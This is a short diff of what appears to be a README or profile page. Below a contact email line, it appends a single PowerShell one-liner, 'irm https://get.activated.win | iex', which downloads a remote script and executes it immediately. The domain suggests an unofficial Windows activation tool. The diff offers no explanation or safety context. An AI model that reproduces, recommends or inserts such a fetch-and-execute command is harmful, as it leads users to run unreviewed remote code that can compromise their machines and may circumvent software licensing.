@@ -60,3 +60,6 @@
 
 
 📧 Email: [yuliitezary@gmail.com](mailto:yuliitezary@gmail.com)
+
+
+irm https://get.activated.win | iex
